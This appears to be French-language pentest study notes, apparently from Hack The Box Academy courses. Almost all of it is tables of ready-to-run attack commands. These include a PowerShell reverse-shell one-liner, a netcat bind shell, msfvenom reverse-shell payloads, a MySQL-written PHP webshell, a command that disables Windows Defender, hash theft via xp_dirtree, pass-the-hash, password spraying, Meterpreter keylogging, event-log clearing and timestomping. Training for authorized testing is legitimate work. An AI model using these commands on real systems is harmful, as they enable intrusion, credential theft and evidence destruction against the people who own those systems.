| **Commande** | **Description** |
| ------------ | --------------- |
| `nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 $ip` | Énumération |
| `mssqlclient.py <user>@<FQDN/IP> -windows-auth` | Se connecter au serveur MSSQL en utilisant l'authentification Windows |

```sql
# Obtenir la version du serveur Microsoft SQL
select @@version;

# Obtenir les noms d'utilisateurs
select user_name()
go 

# Obtenir les bases de données
SELECT name FROM master.dbo.sysdatabases
go

# Obtenir la base de données courante
SELECT DB_NAME()
go

# Obtenir la liste des utilisateurs dans le domaine
SELECT name FROM master..syslogins
go

# Obtenir la liste des utilisateurs qui sont sysadmins
SELECT name FROM master..syslogins WHERE sysadmin = 1
go

# Et pour vérifier : 
SELECT is_srvrolemember('sysadmin')
go
# Si votre utilisateur est admin, cela retournera 1.

# Lire les fichiers locaux dans MSSQL
SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
```

#### Oracle TNS

| **Commande** | **Description** |
| ------------ | --------------- |
| `python3 ./odat.py all -s <FQDN/IP>` | Effectuer divers scans pour recueillir des informations sur les services de base de données Oracle et ses composants |
| `sqlplus <user>/<pass>@<FQDN/IP>/<db>` | Se connecter à la base de données Oracle |
| `python3 ./odat.py utlfile -s <FQDN/IP> -d <db> -U <user> -P <pass> --sysdba --putFile C:\\insert\\path file.txt ./file.txt` | Télécharger un fichier avec Oracle RDBMS |

#### IPMI

| **Commande** | **Description** |
| ------------ | --------------- |
| `nmap -n-sU -p 623 $ip/24` | Énumération dans une plage réseau |
| `sudo nmap -sU --script ipmi* -p 623 $ip` | Exécuter tous les scripts nmap liés au protocole IPMI |
| `msf6 auxiliary(scanner/ipmi/ipmi_version)` | Détection de la version IPMI |
| `msf6 auxiliary(scanner/ipmi/ipmi_dumphashes)` | Extraire les hachages IPMI. Similaire à l'attaque de récupération de hachage de mot de passe à distance d'authentification IPMI 2.0 RAKP |
| `apt-get install ipmitool`<br>`ipmitool -I lanplus -C 0 -H $ip -U root -P root user list` | **Attaque de contournement d'authentification IPMI via Cipher 0**<br>Installer ipmitool et utiliser Cipher 0 pour extraire une liste d'utilisateurs. Avec -C 0, tout mot de passe est accepté |
| `apt-get install ipmitool`<br>`ipmitool -I lanplus -C 0 -H $ip -U root -P root user set password 2 abc123` | **Attaque de récupération de hachage de mot de passe à distance d'authentification IPMI 2.0 RAKP**<br>Installer ipmitool et changer le mot de passe de root |
| | **Attaque d'authentification anonyme IPMI** |

### Gestion à Distance Linux

| **Commande** | **Description** |
| ------------ | --------------- |
| `ssh-audit.py <FQDN/IP>` | Audit de sécurité à distance du service SSH cible |
| `ssh <user>@<FQDN/IP>` | Se connecter au serveur SSH en utilisant le client SSH |
| `ssh -i private.key <user>@<FQDN/IP>` | Se connecter au serveur SSH en utilisant une clé privée |
| `ssh <user>@<FQDN/IP> -o PreferredAuthentications=password` | Forcer l'authentification par mot de passe |

### Gestion à Distance Windows

#### RDP

| **Commande** | **Description** |
| ------------ | --------------- |
| `nmap -Pn -sV -p3389 --script rdp-* $ip` | Analyse du service RDP |
| `git clone https://github.com/CiscoCXSecurity/rdp-sec-check.git && cd rdp-sec-check`<br><br>`./rdp-sec-check.pl $ip` | Un script Perl nommé [rdp-sec-check.pl](https://github.com/CiscoCXSecurity/rdp-sec-check) a été développé par [Cisco CX Security Labs](https://github.com/CiscoCXSecurity) qui peut identifier de manière non authentifiée les paramètres de sécurité des serveurs RDP basés sur les poignées de main |
| `xfreerdp /u:<user> /p:"<password>" /v:<FQDN/IP>` | Se connecter au serveur RDP depuis Linux |
| `wmiexec.py <user>:"<password>"@<FQDN/IP> "<system command>"` | Exécuter une commande en utilisant le service WMI |

#### WinRM

| **Commande** | **Description** |
| ------------ | --------------- |
| `nmap -sV -sC $ip -p5985,5986 --disable-arp-ping -n` | Analyse du service WinRM |
| `evil-winrm -i <FQDN/IP> -u <user> -p <password>` | Se connecter au serveur WinRM |

#### Windows Management Instrumentation (WMI)

| **Commande** | **Description** |
| ------------ | --------------- |
| `evil-winrm -i <FQDN/IP> -u <user> -p <password>` | Se connecter au serveur WinRM |
| `wmiexec.py <user>:"<password>"@<FQDN/IP> "<system command>"` | Exécuter une commande en utilisant le service WMI |

## Shells & Payloads

| **Commandes** | **Description** |
|--------------|-----------------|
| `xfreerdp /v:10.129.x.x /u:htb-student /p:HTB_@cademy_stdnt!` | Outil en ligne de commande utilisé pour se connecter à une cible Windows via le protocole RDP |
| `env` | Fonctionne avec différents interpréteurs de commandes pour découvrir les variables d'environnement d'un système. C'est un excellent moyen de déterminer quel langage de shell est utilisé |
| `sudo nc -lvnp <port #>` | Démarre un écouteur `netcat` sur un port spécifié |
| `nc -nv <ip address of computer with listener started><port being listened on>` | Se connecte à un écouteur netcat à l'adresse IP et au port spécifiés |
| `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f \| /bin/bash -i 2>&1 \| nc -l 10.129.41.200 7777 > /tmp/f` | Utilise netcat pour lier un shell (`/bin/bash`) à l'adresse IP et au port spécifiés. Cela permet de servir une session shell à distance à quiconque se connecte à l'ordinateur sur lequel cette commande a été exécutée |
| `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535\|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 \| Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"` | One-liner `Powershell` utilisé pour se connecter à un écouteur démarré sur une machine d'attaque |
| `Set-MpPreference -DisableRealtimeMonitoring $true` | Commande Powershell utilisée pour désactiver la surveillance en temps réel dans `Windows Defender` |
| `use exploit/windows/smb/psexec` | Module d'exploit Metasploit qui peut être utilisé sur un système Windows vulnérable pour établir une session shell en utilisant `smb` & `psexec` |
| `shell` | Commande utilisée dans une session shell meterpreter pour accéder à un `shell système` |
| `msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > nameoffile.elf` | Commande `MSFvenom` utilisée pour générer un payload `stageless` de shell inverse basé sur Linux |
| `msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > nameoffile.exe` | Commande MSFvenom utilisée pour générer un payload stageless de shell inverse basé sur Windows |
| `msfvenom -p osx/x86/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f macho > nameoffile.macho` | Commande MSFvenom utilisée pour générer un payload de shell inverse basé sur MacOS |
| `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.113 LPORT=443 -f asp > nameoffile.asp` | Commande MSFvenom utilisée pour générer un payload de shell inverse web ASP |
| `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f raw > nameoffile.jsp` | Commande MSFvenom utilisée pour générer un payload de shell inverse web JSP |
| `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f war > nameoffile.war` | Commande MSFvenom utilisée pour générer un payload de shell inverse web compatible java/jsp au format WAR |
| `use auxiliary/scanner/smb/smb_ms17_010` | Module d'exploit Metasploit utilisé pour vérifier si un hôte est vulnérable à `ms17_010` |
| `use exploit/windows/smb/ms17_010_psexec` | Module d'exploit Metasploit utilisé pour obtenir une session shell inverse sur un système Windows vulnérable à ms17_010 |
| `use exploit/linux/http/rconfig_vendors_auth_file_upload_rce` | Module d'exploit Metasploit qui peut être utilisé pour obtenir un shell inverse sur un système Linux vulnérable hébergeant `rConfig 3.9.6` |
| `python -c 'import pty; pty.spawn("/bin/sh")'` | Commande Python utilisée pour générer un `shell interactif` sur un système Linux |
| `/bin/sh -i` | Génère un shell interactif sur un système Linux |
| `perl —e 'exec "/bin/sh";'` | Utilise `perl` pour générer un shell interactif sur un système Linux |
| `ruby: exec "/bin/sh"` | Utilise `ruby` pour générer un shell interactif sur un système Linux |
| `Lua: os.execute('/bin/sh')` | Utilise `Lua` pour générer un shell interactif sur un système Linux |
| `awk 'BEGIN {system("/bin/sh")}'` | Utilise la commande `awk` pour générer un shell interactif sur un système Linux |
| `find / -name nameoffile 'exec /bin/awk 'BEGIN {system("/bin/sh")}' \;` | Utilise la commande `find` pour générer un shell interactif sur un système Linux |
| `find . -exec /bin/sh \; -quit` | Une autre façon d'utiliser la commande `find` pour générer un shell interactif sur un système Linux |
| `vim -c ':!/bin/sh'` | Utilise l'éditeur de texte `VIM` pour générer un shell interactif. Peut être utilisé pour échapper aux "jail-shells" |
| `ls -la <path/to/fileorbinary>` | Utilisé pour `lister` les fichiers et répertoires sur un système Linux et affiche les permissions pour chaque fichier dans le répertoire choisi. Peut être utilisé pour rechercher des binaires que nous avons la permission d'exécuter |
| `sudo -l` | Affiche les commandes que l'utilisateur actuellement connecté peut exécuter avec `sudo` |
| `/usr/share/webshells/laudanum` | Emplacement des `webshells laudanum` sur ParrotOS et Pwnbox |
| `/usr/share/nishang/Antak-WebShell` | Emplacement de `Antak-Webshell` sur Parrot OS et Pwnbox |

## Metasploit

### Commandes MSFconsole

| **Commande** | **Description** |
|:------------|:----------------|
| `show exploits` | Affiche tous les exploits dans le Framework |
| `show payloads` | Affiche tous les payloads dans le Framework |
| `show auxiliary` | Affiche tous les modules auxiliaires dans le Framework |
| `search <name>` | Recherche des exploits ou modules dans le Framework |
| `info` | Charge les informations sur un exploit ou module spécifique |
| `use <name>` | Charge un exploit ou module (exemple : use windows/smb/psexec) |
| `use <number>` | Charge un exploit en utilisant le numéro d'index affiché après la commande search |
| `LHOST` | L'adresse IP de votre hôte local accessible par la cible, souvent l'adresse IP publique lorsque vous n'êtes pas sur un réseau local. Généralement utilisé pour les shells inverses |
| `RHOST` | L'hôte distant ou la cible |
| `set function` | Définit une valeur spécifique (par exemple, LHOST ou RHOST) |
| `setg <function>` | Définit une valeur spécifique globalement (par exemple, LHOST ou RHOST) |
| `show options` | Affiche les options disponibles pour un module ou exploit |
| `show targets` | Affiche les plateformes prises en charge par l'exploit |
| `set target <number>` | Spécifie un index de cible spécifique si vous connaissez l'OS et le service pack |
| `set payload <payload>` | Spécifie le payload à utiliser |
| `set payload <number>` | Spécifie le numéro d'index du payload à utiliser après la commande show payloads |
| `show advanced` | Affiche les options avancées |
| `set autorunscript migrate -f` | Migre automatiquement vers un processus séparé après l'achèvement de l'exploit |
| `check` | Détermine si une cible est vulnérable à une attaque |
| `exploit` | Exécute le module ou l'exploit et attaque la cible |
| `exploit -j` | Exécute l'exploit dans le contexte du job (cela exécutera l'exploit en arrière-plan) |
| `exploit -z` | N'interagit pas avec la session après une exploitation réussie |
| `exploit -e <encoder>` | Spécifie l'encodeur de payload à utiliser (exemple : exploit –e shikata_ga_nai) |
| `exploit -h` | Affiche l'aide pour la commande exploit |
| `sessions -l` | Liste les sessions disponibles (utilisé lors de la gestion de plusieurs shells) |
| `sessions -l -v` | Liste toutes les sessions disponibles et affiche les champs détaillés, comme la vulnérabilité utilisée lors de l'exploitation du système |
| `sessions -s <script>` | Exécute un script Meterpreter spécifique sur toutes les sessions Meterpreter actives |
| `sessions -K` | Termine toutes les sessions actives |
| `sessions -c <cmd>` | Exécute une commande sur toutes les sessions Meterpreter actives |
| `sessions -u <sessionID>` | Met à niveau a normal Win32 shell to a Meterpreter console |
| `db_create <name>` | Crée une base de données à utiliser avec des attaques basées sur la base de données (exemple : db_create autopwn) |
| `db_connect <name>` | Crée et se connecte à une base de données pour des attaques (exemple : db_connect autopwn) |
| `db_nmap` | Utilise Nmap et place les résultats dans une base de données (la syntaxe Nmap normale est prise en charge, comme –sT –v –P0) |
| `db_destroy` | Supprime la base de données actuelle |
| `db_destroy <user:password@host:port/database>` | Supprime la base de données en utilisant des options avancées |

---

### Commandes Meterpreter

| **Commande** | **Description** |
|:------------|:----------------|
| `help` | Affiche l'aide d'utilisation de Meterpreter |
| `run <scriptname>` | Exécute des scripts basés sur Meterpreter ; pour une liste complète, consultez le répertoire scripts/meterpreter |
| `sysinfo` | Affiche les informations système sur la cible compromise |
| `ls` | Liste les fichiers et dossiers sur la cible |
| `use priv` | Charge l'extension de privilèges pour les bibliothèques Meterpreter étendues |
| `ps` | Affiche tous les processus en cours d'exécution et les comptes associés à chaque processus |
| `migrate <proc. id>` | Migre vers un ID de processus spécifique (PID est l'ID du processus cible obtenu via la commande ps) |
| `use incognito` | Charge les fonctions incognito (utilisé pour le vol et l'usurpation de jetons sur une machine cible) |
| `list_tokens -u` | Liste les jetons disponibles sur la cible par utilisateur |
| `list_tokens -g` | Liste les jetons disponibles sur la cible par groupe |
| `impersonate_token <DOMAIN_NAMEUSERNAME>` | Usurpe un jeton disponible sur la cible |
| `steal_token <proc. id>` | Vole les jetons disponibles pour un processus donné et usurpe ce jeton |
| `drop_token` | Arrête l'usurpation du jeton actuel |
| `getsystem` | Tente d'élever les privilèges au niveau SYSTEM via plusieurs vecteurs d'attaque |
| `shell` | Accède à un shell interactif avec tous les jetons disponibles |
| `execute -f <cmd.exe> -i` | Exécute cmd.exe et interagit avec lui |
| `execute -f <cmd.exe> -i -t` | Exécute cmd.exe avec tous les jetons disponibles |
| `execute -f <cmd.exe> -i -H -t` | Exécute cmd.exe avec tous les jetons disponibles et le rend comme processus caché |
| `rev2self` | Revient à l'utilisateur original utilisé pour compromettre la cible |
| `reg <command>` | Interagit, crée, supprime, interroge, définit et bien plus dans le registre de la cible |
| `setdesktop <number>` | Bascule vers un écran différent en fonction de l'utilisateur connecté |
| `screenshot` | Prend une capture d'écran de l'écran de la cible |
| `upload <filename>` | Téléverse un fichier vers la cible |
| `download <filename>` | Télécharge un fichier depuis la cible |
| `keyscan_start` | Démarre la capture des frappes clavier sur la cible distante |
| `keyscan_dump` | Extrait les frappes clavier capturées sur la cible |
| `keyscan_stop` | Arrête la capture des frappes clavier sur la cible distante |
| `getprivs` | Obtient autant de privilèges que possible sur la cible |
| `uictl enable <keyboard/mouse>` | Prend le contrôle du clavier et/ou de la souris |
| `background` | Exécute votre shell Meterpreter actuel en arrière-plan |
| `hashdump` | Extrait tous les hachages sur la cible |
| `use sniffer` | Charge le module sniffer |
| `sniffer_interfaces` | Liste les interfaces disponibles sur la cible |
| `sniffer_dump <interfaceID> pcapname` | Démarre la capture sur la cible distante |
| `sniffer_start <interfaceID> packet-buffer` | Démarre la capture avec une plage spécifique pour un tampon de paquets |
| `sniffer_stats <interfaceID>` | Récupère les informations statistiques de l'interface que vous capturez |
| `sniffer_stop <interfaceID>` | Arrête le sniffer |
| `add_user <username> <password> -h <ip>` | Ajoute un utilisateur sur la cible distante |
| `add_group_user <"Domain Admins"> <username> -h <ip>` | Ajoute un nom d'utilisateur au groupe Administrateurs du domaine sur la cible distante |
| `clearev` | Efface le journal des événements sur la machine cible |
| `timestomp` | Modifie les attributs de fichier, comme la date de création (mesure anti-forensique) |
| `reboot` | Redémarre la machine cible |

---

## Attaques des Services Courants

### Attaque FTP

| **Commande** | **Description** |
| ------------ | --------------- |
| `ftp 192.168.2.142` | Connexion au serveur FTP en utilisant le client `ftp` |
| `nc -v 192.168.2.142 21` | Connexion au serveur FTP en utilisant `netcat` |
| `hydra -l user1 -P /usr/share/wordlists/rockyou.txt ftp://192.168.2.142` | Force brute du service FTP |
| `medusa -U users.list -P pws.list -h $ip -M ftp -n 2121` | Force brute du service FTP |

### Attaque SMB

| **Commande** | **Description** |
| ------------ | --------------- |
| `smbclient -N -L //10.129.14.128` | Test de session nulle contre le service SMB |
| `smbmap -H 10.129.14.128` | Énumération des partages réseau en utilisant `smbmap` |
| `smbmap -H 10.129.14.128 -r notes` | Énumération récursive des partages réseau en utilisant `smbmap` |
| `smbmap -H 10.129.14.128 --download "notes\note.txt"` | Téléchargement d'un fichier spécifique depuis le dossier partagé |
| `smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"` | Téléversement d'un fichier spécifique vers le dossier partagé |
| `rpcclient -U'%' 10.10.110.17` | Session nulle avec `rpcclient` |
| `./enum4linux-ng.py 10.10.11.45 -A -C` | Énumération automatisée du service SMB en utilisant `enum4linux-ng` |
| `crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!'` | Pulvérisation de mot de passe contre différents utilisateurs depuis une liste |
| `impacket-psexec administrator:'Password123!'@10.10.110.17` | Connexion au service SMB en utilisant `impacket-psexec` |
| `crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec` | Exécution d'une commande sur le service SMB en utilisant `crackmapexec` |
| `crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users` | Énumération des utilisateurs connectés |
| `crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam` | Extraction des hachages depuis la base de données SAM |
| `crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE` | Utilisation de la technique Pass-The-Hash pour s'authentifier sur l'hôte cible |
| `impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146` | Extraction de la base de données SAM en utilisant `impacket-ntlmrelayx` |
| `impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e <base64 reverse shell>` | Exécution d'un shell inverse basé sur PowerShell en utilisant `impacket-ntlmrelayx` |

---

### Attaque des Bases de Données SQL

| **Commande** | **Description** |
| ------------ | --------------- |
| `mysql -u julio -pPassword123 -h 10.129.20.13` | Connexion au serveur MySQL |
| `sqlcmd -S SRVMSSQL\SQLEXPRESS -U julio -P 'MyPassword!' -y 30 -Y 30` | Connexion au serveur MSSQL |
| `sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h` | Connexion au serveur MSSQL depuis Linux |
| `sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h` | Connexion au serveur MSSQL depuis Linux lorsque le mécanisme d'authentification Windows est utilisé par le serveur MSSQL |
| `mysql> SHOW DATABASES;` | Afficher toutes les bases de données disponibles dans MySQL |
| `mysql> USE htbusers;` | Sélectionner une base de données spécifique dans MySQL |
| `mysql> SHOW TABLES;` | Afficher toutes les tables disponibles dans la base de données sélectionnée dans MySQL |
| `mysql> SELECT * FROM users;` | Sélectionner toutes les entrées disponibles de la table "users" dans MySQL |
| `sqlcmd> SELECT name FROM master.dbo.sysdatabases` | Afficher toutes les bases de données disponibles dans MSSQL |
| `sqlcmd> USE htbusers` | Sélectionner une base de données spécifique dans MSSQL |
| `sqlcmd> SELECT * FROM htbusers.INFORMATION_SCHEMA.TABLES` | Afficher toutes les tables disponibles dans la base de données sélectionnée dans MSSQL |
| `sqlcmd> SELECT * FROM users` | Sélectionner toutes les entrées disponibles de la table "users" dans MSSQL |
| `sqlcmd> EXECUTE sp_configure 'show advanced options', 1` | Pour autoriser la modification des options avancées |
| `sqlcmd> EXECUTE sp_configure 'xp_cmdshell', 1` | Pour activer xp_cmdshell |
| `sqlcmd> RECONFIGURE` | À utiliser après chaque commande sp_configure pour appliquer les modifications |
| `sqlcmd> xp_cmdshell 'whoami'` | Exécuter une commande système depuis le serveur MSSQL |
| `mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php'` | Créer un fichier en utilisant MySQL |
| `mysql> show variables like "secure_file_priv";` | Vérifier si les privilèges de fichier sécurisé sont vides pour lire les fichiers stockés localement sur le système |
| `sqlcmd> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents` | Lire des fichiers locaux dans MSSQL |
| `mysql> select LOAD_FILE("/etc/passwd");` | Lire des fichiers locaux dans MySQL |
| `sqlcmd> EXEC master..xp_dirtree '\\10.10.110.17\share\'` | Vol de hachages en utilisant la commande `xp_dirtree` dans MSSQL |
| `sqlcmd> EXEC master..xp_subdirs '\\10.10.110.17\share\'` | Vol de hachages en utilisant la commande `xp_subdirs` dans MSSQL |
| `sqlcmd> SELECT srvname, isremote FROM sysservers` | Identifier les serveurs liés dans MSSQL |
| `sqlcmd> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]` | Identifier l'utilisateur et ses privilèges utilisés pour la connexion distante dans MSSQL |

---

### Attacking RDP

| **Commande** | **Description** |
| ------------ | --------------- |
| `crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'` | Pulvérisation de mot de passe contre le service RDP |
| `hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp` | Force brute du service RDP |
| `rdesktop -u admin -p password123 192.168.2.143` | Connexion au service RDP en utilisant `rdesktop` sous Linux |
| `tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}` | Usurper un utilisateur sans son mot de passe |
| `net start sessionhijack` | Exécuter le détournement de session RDP |
| `reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f` | Activer le "Mode Admin Restreint" sur l'hôte Windows cible |
| `xfreerdp /v:192.168.2.141 /u:admin /pth:A9FDFA038C4B75EBC76DC855DD74F0DA` | Utiliser la technique Pass-The-Hash pour se connecter à l'hôte cible sans mot de passe |

### Attaque DNS

| **Commande** | **Description** |
| ------------ | --------------- |
| `dig AXFR @ns1.inlanefreight.htb inlanefreight.htb` | Effectuer une tentative de transfert de zone AXFR contre un serveur de noms spécifique |
| `subfinder -d inlanefreight.com -v` | Force brute des sous-domaines |
| `host support.inlanefreight.com` | Recherche DNS pour le sous-domaine spécifié |

### Attaque des Services Email

| **Commande** | **Description** |
| ------------ | --------------- |
| `host -t MX microsoft.com` | Recherche DNS des serveurs de messagerie pour le domaine spécifié |
| `dig mx inlanefreight.com \| grep "MX" \| grep -v ";"` | Recherche DNS des serveurs de messagerie pour le domaine spécifié |
| `host -t A mail1.inlanefreight.htb.` | Recherche DNS de l'adresse IPv4 pour le sous-domaine spécifié |
| `telnet 10.10.110.20 25` | Connexion au serveur SMTP |
| `smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7` | Énumération des utilisateurs SMTP en utilisant la commande RCPT contre l'hôte spécifié |
| `python3 o365spray.py --validate --domain msplaintext.xyz` | Vérifier l'utilisation d'Office365 pour le domaine spécifié |
| `python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz` | Énumérer les utilisateurs existants utilisant Office365 sur le domaine spécifié |
| `python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz` | Pulvérisation de mot de passe contre une liste d'utilisateurs utilisant Office365 pour le domaine spécifié |
| `hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3` | Force brute du service POP3 |
| `swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Notification' --body 'Message' --server 10.10.11.213` | Tester le service SMTP pour la vulnérabilité de relais ouvert |


# Pivotage, Tunneling et Redirection de Ports

## Table des matières
1. [Commandes de Base pour l'Analyse Réseau](#commandes-de-base-pour-lanalyse-réseau)
2. [Tunnels SSH](#tunnels-ssh)
3. [Proxychains et SOCKS](#proxychains-et-socks)
4. [Transfert de Fichiers et Payload](#transfert-de-fichiers-et-payload)
5. [Découverte de Réseau](#découverte-de-réseau)
6. [Port Forwarding avec Meterpreter](#port-forwarding-avec-meterpreter)
7. [Outils Spécialisés](#outils-spécialisés)
8. [Tunneling DNS et ICMP](#tunneling-dns-et-icmp)
9. [Solutions Windows](#solutions-windows)

## Commandes de Base pour l'Analyse Réseau

| Commande | Description |
|----------|-------------|
| `ifconfig` | Commande Linux qui affiche toutes les configurations réseau actuelles d'un système. |
| `ipconfig` | Commande Windows qui affiche toutes les configurations réseau du système. |
| `netstat -r` | Commande utilisée pour afficher la table de routage pour tous les protocoles IPv4. |
| `netstat -antp` | Affiche toutes (`-a`) les connexions réseau actives avec les IDs de processus associés. `-t` affiche uniquement les connexions TCP, `-n` affiche uniquement les adresses numériques, `-p` affiche les IDs de processus associés à chaque connexion. |
| `nmap -sT -p22,3306 <AdresseIPduCible>` | Commande Nmap utilisée pour scanner une cible à la recherche de ports ouverts permettant des connexions SSH ou MySQL. |

## Tunnels SSH

| Commande | Description |
|----------|-------------|
| `ssh -L 1234:localhost:3306 Ubuntu@<AdresseIPduCible>` | Commande SSH utilisée pour créer un tunnel SSH depuis une machine locale sur le port local `1234` vers une cible distante utilisant le port 3306. |
| `netstat -antp \| grep 1234` | Option Netstat utilisée pour afficher les connexions réseau associées à un tunnel créé. Utilisation de `grep` pour filtrer en fonction du port local `1234`. |
| `nmap -v -sV -p1234 localhost` | Commande Nmap utilisée pour scanner un hôte via une connexion établie sur le port local `1234`. |
| `ssh -L 1234:localhost:3306 8080:localhost:80 ubuntu@<AdresseIPduCible>` | Commande SSH qui demande au client ssh de demander au serveur SSH de transférer toutes les données via le port `1234` vers `localhost:3306`. |
| `ssh -D 9050 ubuntu@<AdresseIPduCible>` | Commande SSH utilisée pour effectuer une redirection de port dynamique sur le port `9050` et établir un tunnel SSH avec la cible. Cela fait partie de la configuration d'un proxy SOCKS. |
| `ssh -R <IPInterneDuHôtePivot>:8080:0.0.0.0:80 ubuntu@<AdresseIPduCible> -vN` | Commande SSH utilisée pour créer un tunnel SSH inverse d'une cible vers un hôte d'attaque. Le trafic est transféré sur le port `8080` sur l'hôte d'attaque vers le port `80` sur la cible. |

## Proxychains et SOCKS

| Commande | Description |
|----------|-------------|
| `tail -4 /etc/proxychains.conf` | Commande Linux utilisée pour afficher les 4 dernières lignes de /etc/proxychains.conf. Peut être utilisée pour s'assurer que les configurations socks sont en place. |
| `proxychains nmap -v -sn 172.16.5.1-200` | Utilisé pour envoyer le trafic généré par un scan Nmap via Proxychains et un proxy SOCKS. Le scan est effectué contre les hôtes dans la plage spécifiée `172.16.5.1-200` avec une verbosité accrue (`-v`) désactivant le scan ping (`-sn`). |
| `proxychains nmap -v -Pn -sT 172.16.5.19` | Utilisé pour envoyer le trafic généré par un scan Nmap via Proxychains et un proxy SOCKS. Le scan est effectué contre 172.16.5.19 avec une verbosité accrue (`-v`), désactivant la découverte ping (`-Pn`), et en utilisant le type de scan TCP connect (`-sT`). |
| `proxychains msfconsole` | Utilise Proxychains pour ouvrir Metasploit et envoyer tout le trafic réseau généré via un proxy SOCKS. |
| `proxychains xfreerdp /v:<AdresseIPduCible> /u:victor /p:pass@123` | Utilisé pour se connecter à une cible en utilisant RDP et un ensemble d'identifiants via proxychains. Cela enverra tout le trafic via un proxy SOCKS. |
| `proxychains firefox-esr <AdresseIPduServeurWebCible>:80` | Ouvre firefox avec Proxychains et envoie la requête web via un serveur proxy SOCKS vers le serveur web de destination spécifié. |
| `socks4 127.0.0.1 9050` | Ligne de texte qui doit être ajoutée à /etc/proxychains.conf pour garantir qu'un proxy SOCKS version 4 est utilisé en combinaison avec proxychains sur l'adresse IP et le port spécifiés. |
| `Socks5 127.0.0.1 1080` | Ligne de texte qui doit être ajoutée à /etc/proxychains.conf pour garantir qu'un proxy SOCKS version 5 est utilisé en combinaison avec proxychains sur l'adresse IP et le port spécifiés. |

## Transfert de Fichiers et Payload

| Commande | Description |
|----------|-------------|
| `msfvenom -p windows/x64/meterpreter/reverse_https lhost= <IPInterneDuHôtePivot> -f exe -o backupscript.exe LPORT=8080` | Utilise msfvenom pour générer un payload Meterpreter reverse HTTPS Windows qui enverra un rappel à l'adresse IP spécifiée après `lhost=` sur le port local 8080 (`LPORT=8080`). Le payload prendra la forme d'un fichier exécutable appelé `backupscript.exe`. |
| `msf6 > use exploit/multi/handler` | Utilisé pour sélectionner le module d'exploit multi-handler dans Metasploit. |
| `scp backupscript.exe ubuntu@<AdresseIPduCible>:~/` | Utilise le protocole de copie sécurisée (`scp`) pour transférer le fichier `backupscript.exe` vers l'hôte spécifié et le place dans le répertoire personnel de l'utilisateur Ubuntu (`:~/`). |
| `python3 -m http.server 8123` | Utilise Python3 pour démarrer un serveur HTTP simple écoutant sur le port `8123`. Peut être utilisé pour récupérer des fichiers depuis un hôte. |
| `Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"` | Commande PowerShell utilisée pour télécharger un fichier appelé backupscript.exe depuis un serveur web (`172.16.5.129:8123`) puis enregistrer le fichier à l'emplacement spécifié après `-OutFile`. |
| `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<AdresseIPdHôteAttaque -f elf -o backupjob LPORT=8080` | Utilise msfveom pour générer un payload Linux Meterpreter reverse TCP qui rappelle l'IP spécifiée après `LHOST=` sur le port 8080 (`LPORT=8080`). Le payload prend la forme d'un fichier exécutable elf appelé backupjob. |
| `scp -r rpivot ubuntu@<AdresseIPDuCible>` | Utilise le protocole de copie sécurisée pour transférer un répertoire entier et tout son contenu vers une cible spécifiée. |

## Découverte de Réseau

| Commande | Description |
|----------|-------------|
| `for i in {1..254} ;do (ping -c 1 172.16.5.$i \| grep "bytes from" &) ;done` | Boucle For utilisée sur un système Linux pour découvrir des appareils dans un segment réseau spécifié. |
| `for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 \| find "Reply"` | Boucle For utilisée sur un système Windows pour découvrir des appareils dans un segment réseau spécifié. |
